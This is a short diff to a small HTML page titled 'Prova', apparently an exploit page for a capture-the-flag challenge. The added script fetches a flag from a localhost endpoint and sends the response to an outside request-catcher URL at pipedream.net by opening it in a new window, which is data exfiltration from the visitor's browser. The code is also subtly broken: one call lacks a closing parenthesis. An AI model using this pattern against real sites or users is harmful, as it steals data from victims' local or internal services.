@@ -2,7 +2,9 @@
   <head>
     <title>Prova</title>
     <script>
-      window.open("http://localhost/get_flag.php");
+      fetch("http://localhost/get_flag.php").then(response => {
+        window.open("https://enahomwjmoi9k.x.pipedream.net/" + response 
+      }).catch(error => console.log("Si è verificato un errore!"))
     </script>
   </head>
 </html>
